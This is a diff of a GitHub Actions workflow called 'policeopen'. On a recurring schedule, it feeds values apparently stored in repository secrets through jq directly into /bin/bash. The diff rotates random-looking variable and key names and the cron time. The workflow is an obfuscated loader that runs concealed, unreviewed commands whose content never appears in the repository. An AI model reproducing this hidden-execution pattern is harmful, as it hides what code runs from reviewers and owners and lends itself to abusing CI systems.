@@ -1,32 +1,25 @@
 name: policeopen
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 4/6 * * *'
+    - cron: '52 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: policeopen
         env:
-          wmawn038: ${{ secrets.wmawn038 }}
+          ggq7256: ${{ secrets.ggq7256 }}
         run: |
-          echo $wmawn038 | jq -r .sj1108 | /bin/bash
-          echo $lys187 | jq -r .plh64 | /bin/bash
-          echo $jwtk9539 | jq -r .p73 | /bin/bash
-          echo $zwe58200 | jq -r .h77363 | /bin/bash
-          echo $v37 | jq -r .ler2231 | /bin/bash
-          echo $uj81766 | jq -r .dly4079 | /bin/bash
-          echo $wawx11195 | jq -r .rke07083 | /bin/bash
-          echo $ngi04523 | jq -r .oemr7908 | /bin/bash
-          echo $wfp29 | jq -r .ngain83 | /bin/bash
-          echo $rdscj56172 | jq -r .pzud53743 | /bin/bash
-          echo $bfmw2 | jq -r .jm63 | /bin/bash
-          echo $rcp89295 | jq -r .ewb9065 | /bin/bash
-          echo $uog80 | jq -r .mrmn7 | /bin/bash
-          echo $o09035 | jq -r .uo2936 | /bin/bash
+          echo $ggq7256 | jq -r .jwuy37 | /bin/bash
+          echo $jimpx5 | jq -r .vejjo54 | /bin/bash
+          echo $odzc08785 | jq -r .e772 | /bin/bash
+          echo $vt5 | jq -r .uvllj825 | /bin/bash
+          echo $skw64002 | jq -r .yne427 | /bin/bash
+          echo $lpskx7422 | jq -r .yj5 | /bin/bash
+          echo $obpsq95 | jq -r .qg7 | /bin/bash
+          echo $kdu0 | jq -r .e4 | /bin/bash
+          echo $bbhqy58 | jq -r .di25441 | /bin/bash
 
